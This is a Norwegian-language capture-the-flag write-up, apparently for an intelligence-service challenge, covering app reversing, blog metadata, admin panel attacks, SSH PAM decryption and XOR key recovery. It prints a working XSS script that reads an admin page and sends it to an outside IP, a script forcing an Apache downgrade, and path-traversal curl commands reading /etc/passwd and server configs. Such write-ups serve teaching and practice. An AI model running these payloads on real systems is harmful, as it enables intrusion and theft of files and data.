<p align="center">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Coat_of_arms_of_the_Norwegian_Intelligence_Service.svg/800px-Coat_of_arms_of_the_Norwegian_Intelligence_Service.svg.png" style="width:200px;display:block;text-align:center;">
</p>

<h1>Oppdrag</h1>
Vi får vite om 2 ulike side som etjenesten har fanget opp. Meldingstjenesten blog.utl og anvilshop.utl, i tillegg får vi levert ut en apk fil som er appen de bruker til å kommunisere. Du kan lese oppdraget <a href="https://github.com/UllernJ/Etjenesten-writeup/blob/main/oppdrag.txt">her</a>.

<h2>2.1</h2>
Det vi skal er å reversere appen, jeg overførte filen til tlfen og la merke til jeg ble automatisk logget inn som user. Dette betyr at passordet er lagret i appen. Jeg brukte jadx-gui for å undersøke filen og fant ut at det ble brukt en rot13 kryptering på passordet.
<p></p>
<code>editor.putString("password", rot13("xxxxxxxx"));</code>
<p></p>
flagget er passordet dekryptert. rot13 er en veldig dårlig kryptering og kan lett dekrypteres.
Vi har nå funnet innlogging til en tor nettside / blog.utl

<h2>2.2</h2>
Flagget ligger i meta dataen på nettsiden, dette flagget kan vi finne med <code>curl blog.utl -v</code> eller selv gå inn på siden via tor link og lese av meta dataen.
<p></p>
<h2>2.3</h2>
Det vi finner ut her via /logs/ er at admin refresher hoved siden hvert 10. sekund og responderer på XSS. Vi ser også at han gjør en POST request på /admin/update. Det vi vil her er å finne ut hva slags parametere /admin/update tar inn. Og naturligvis ligger det i /admin/ siden.
Det jeg gjorde da var å starte en webserver på CTF’en sin ssh. Siden admin på den siden kunne kommunisere med oss der, siden dette da er et lukket miljø.

```
//get_site.js
<script>
xhr = new XMLHttpRequest();
xhr.open("GET","/admin/");
xhr.send();
xhr.onload = function(){
  request = new XMLHttpRequest();
  request.open("GET", "http://10.1.44.162/"+encodeURI(xhr.responseText), true);
  request.send();
}
</script>
```
Scripten <a href="https://github.com/UllernJ/Etjenesten-writeup/blob/main/get_site.js">(get_site.js)</a> gjorde det mulig for oss å se hvordan nettsiden så ut. Det eneste vi trengte å gjøre var å decodeURI for å se innholdet. Ved å se innholdet får vi flagget. 

<h2>2.4</h2>
Det vi ser er at vi kan sende parametere til /admin/update via /admin. Dette gjør vi med <a href="https://github.com/UllernJ/Etjenesten-writeup/blob/main/post_adminupdate.js">post_adminupdate.js</a>

```
//post_adminupdate.js
<script>
xhr = new XMLHttpRequest();
xhr.open("POST","/admin/update", true);
xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
xhr.send("service=apache&version=2.4.49");  //vi får admin til å nedgradere anvilshop.utl
</script>
```

Vi får flagget ved å endre innholdet til anvilshop.utl.

<h2>2.5</h2>
Det vi finner ut ved et kjapp google søk er at med denne apache versjonen kan utnytes ved path traversal.
<p></p>
Dette åpner for denne exploiten: https://www.exploit-db.com/exploits/50383
Etter mye graving fant jeg 3 interessante filer (disse ga også samme flagg)

```
curl anvilshop.utl/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/httpd.conf
curl anvilshop.utl/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
curl anvilshop.utl/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/ssh/sshd_config
```

<h2>2.9</h2>
Jeg gjorde et nmap på anvilshop.utl og la merke til at port 22 var åpen og når vi ssh som user fikk vi er spesiell response.
Og igjen i sshd_config fant vi ut at hosten brukte en PAM autorisering for ssh og refererte til en fil med navn <b>pam_customs.so</b>
<p>I filen fant vi mye interessant, spesielt denne funksjonen fanget interessen.</p>
<img src="https://github.com/UllernJ/Etjenesten-writeup/blob/main/pam.png">
<p>Her kan vi se at den bruker en funksjon som heter <b>Crypto_secretbox_easy</b>. Library finner du <a href="https://sodium-friends.github.io/docs/docs/secretkeyboxencryption">her.</a></p> Dette gjorde det litt lettere å forstå hva det er vi ser på. Vi kan også se at den henter en nøkkel fra <b>/tmp/keyfile</b>. 
Denne viser seg å være nyttig til dekrypteringen. Det viser seg at passorde endrer seg jevnelig, siden den krever at vi vet hvordan vi krypterer og får løsningen. Siden krypterings koden ikke er så fin så linker jeg den <a href="https://github.com/UllernJ/Etjenesten-writeup/blob/main/ssh_decrypt.js">her.</a>

<h2>2.10</h2>
Med litt letting på brukeren finner vi enda en ssh server å koble seg på. Denne løses helt likt som 2.9.

<h2>3.1.1</h2>
Her får vi en fil der flagget er kryptert. Men vi har også tilgang til å bruke programmet som krypterte flagget. Flagget er 46 bytes, så jeg forsøkte å løse denne med xor.
Jeg krypterte 46*A'er og brukte XOR for å få nøkkelen. Vi får ta keyen i hexadecimal:

```
35323936383939353737333632323539393431333839313234393732313737353238333437393133313531353537
```

Dette kombinert med den krypterte flagget ga da flagget. Vi får da svaret i hexidecimal.

```
65746a7b6c796b6b656c69675f65725f64656e5f736f6d5f7665745f73697374655f7369666665725f695f70697d
```

Som vi kan konvertere tilbake til: <b>etj{lykkelig_er_den_som_vet_siste_siffer_i_pi}</b>
